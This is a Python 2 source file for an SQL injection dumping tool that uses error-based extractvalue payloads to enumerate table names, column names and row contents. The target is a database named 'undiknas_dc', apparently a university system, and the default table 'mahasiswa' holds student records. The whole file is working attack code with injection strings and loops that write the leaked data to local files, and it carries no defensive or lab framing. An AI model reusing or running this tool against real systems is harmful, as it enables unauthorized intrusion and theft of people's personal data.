import requests
from sploithelper import attack
from bs4 import BeautifulSoup

class Dump():
    def __init__(self, url):
            self.url = url

    def dumpTable(self, save_file="outputtable.txt"):
        with requests.Session() as conn:
            file = open(save_file, "w+")
            try:
                for i in range(433):
                    query = "19' and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema='undiknas_dc'LIMIT {},1)))-- ".format(i)
                    
                    table_leak = attack(conn, query)
                    soup = BeautifulSoup(table_leak.text, 'html.parser')
                    table_name = soup.findAll('p')[1]

                    table_name = str(table_name)[25:-5]
                    print "Dumped table name : " + table_name
                    file.write(table_name + '\r\n')
                
                file.close()
            except KeyboardInterrupt:
                print 'Connection cut'

    def dumpData(self, columns=10, table='mahasiswa', column_name='nama', order='', save_file="outputdata.txt"):
        with requests.Session() as conn:
            file = open(save_file, "w+")
            try:
                for i in range(columns):
                    if order == '':
                        query = "19' and extractvalue(0x0a,concat(0x0a," \
                                + "(select {} from {} limit {},1)))-- ".format(column_name, table, i)
                    else:
                        query = "19' and extractvalue(0x0a,concat(0x0a," \
                                + "(select {} from {} ORDER BY {} ASC limit {},1)))-- ".format(column_name, table, order, i)

                    # print query
                    data_leak = attack(conn, query)
                    # print data_leak.text
                    soup = BeautifulSoup(data_leak.text, 'html.parser')
                    leaked_data = str(soup.findAll('p')[1])[25:-5]
                    print leaked_data
                    file.write(leaked_data + '\r\n')
                
                file.close()

            except KeyboardInterrupt:
                print 'Connection cut'

    def dumpColumns(self, table='mahasiswa', columns=10, save_file="outputcol.txt"):
        with requests.Session() as conn:
            file = open(save_file, "w+")
            try:
                for i in range(columns):
                    query = "19'and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns " \
                            + "where table_schema=database() and table_name='{}' limit {},1)))-- ".format(table, i)

                    column_leak = attack(conn, query)
                    soup = BeautifulSoup(column_leak.text, 'html.parser')
                    column_name = str(soup.findAll('p')[1])[25:-5]                
                    print column_name
                    file.write(column_name + "\r\n")
                
                file.close()
            
            except KeyboardInterrupt:
                print 'Connection cut'